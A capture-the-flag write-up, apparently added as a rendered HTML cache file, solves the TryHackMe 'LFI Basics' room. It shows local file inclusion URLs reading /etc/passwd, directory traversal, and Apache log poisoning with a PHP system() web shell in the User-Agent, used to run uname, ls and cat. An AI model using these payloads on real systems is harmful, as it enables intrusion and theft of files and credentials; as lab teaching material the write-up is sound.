@@ -1,0 +1,80 @@
+I"<p>It’s a write-up about the room : <a href="https://tryhackme.com/room/lfibasics">Try Hack Me - Room : LFI Basics</a></p>
+
+<h1 id="task-1---local-file-inclusion">[Task 1] - Local File Inclusion</h1>
+
+<ul>
+  <li>What’s the message you get when you include the home.html?</li>
+</ul>
+
+<p>We went on <code class="language-plaintext highlighter-rouge">http://ip_machine/lfi/lfi.php/?page=home.html</code> and the message was <strong>You included home.html</strong>.</p>
+
+<ul>
+  <li>What user that it’s not by default there is present?</li>
+</ul>
+
+<p>We read the passwd file : <code class="language-plaintext highlighter-rouge">http://ip_machine/lfi/lfi.php/?page=/etc/passwd</code> and found the user <strong>lfi</strong>.</p>
+
+<h1 id="task-2---local-file-inclusion-using-directory-traversal">[Task 2] - Local File Inclusion using Directory Traversal</h1>
+
+<ul>
+  <li>
+    <p>Add the “?page=” parameter, and try to include the home page again. Does it work (Yes/No)? <strong>No</strong></p>
+  </li>
+  <li>
+    <p>What are the credit card numbers ?</p>
+  </li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">http://ip_machine/lfi2/lfi.php/?page=../creditcard</code> and found <strong>1111-2222-3333-4444</strong>.</p>
+
+<h1 id="task-3---reaching-rce-using-lfi-and-log-poisoning">[Task 3] - Reaching RCE using LFI and log poisoning</h1>
+
+<p><code class="language-plaintext highlighter-rouge">http://ip_machine/lfi/lfi.php/?page=/var/log/apache2/access.log</code></p>
+
+<ul>
+  <li>
+    <p>Can you read the log (Yes/No)? <strong>Yes</strong></p>
+  </li>
+  <li>
+    <p>Give it a try and run uname -r. What’s the output of the command?</p>
+  </li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">http://ip_machine/lfi/lfi.php?page=/var/log/apache2/access.log&amp;lfi= uname -r</code></p>
+
+<p>With BurpSuite, we changed the User-Agent :<br />
+<code class="language-plaintext highlighter-rouge">Mozilla/5.0 &lt;?php system($_GET['lfi']); ?&gt; Firefox/79.0</code>.</p>
+
+<p>And after that we send with the repeater : <code class="language-plaintext highlighter-rouge">http://&lt;IP&gt;/lfi/lfi.php?page=/var/log/apache2/access.log&amp;lfi=uname%20-r</code>.<br />
+The answer is : <code class="language-plaintext highlighter-rouge">4.15.0-72-generic</code></p>
+
+<ul>
+  <li>With this knowledge read the flag from the lfi user home directory.</li>
+</ul>
+
+<p>To begin we searched what file can contained the flag with the command ls in the lfi user home directory : <code class="language-plaintext highlighter-rouge">GET /lfi/lfi.php?page=/var/log/apache2/access.log&amp;lfi=ls%20../../../../../../home/lfi/</code></p>
+
+<p>We found :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre>Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+flag.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Therefore we read the content of the file flag.txt : 
+<code class="language-plaintext highlighter-rouge">GET /lfi/lfi.php?page=/var/log/apache2/access.log&amp;lfi=cat%20../../../../../../home/lfi/flag.txt</code>.</p>
+
+<p>We found the last flag : <strong>THM{a352a5c2acfd22251c3a94105b718fea}</strong>.</p>
+:ET
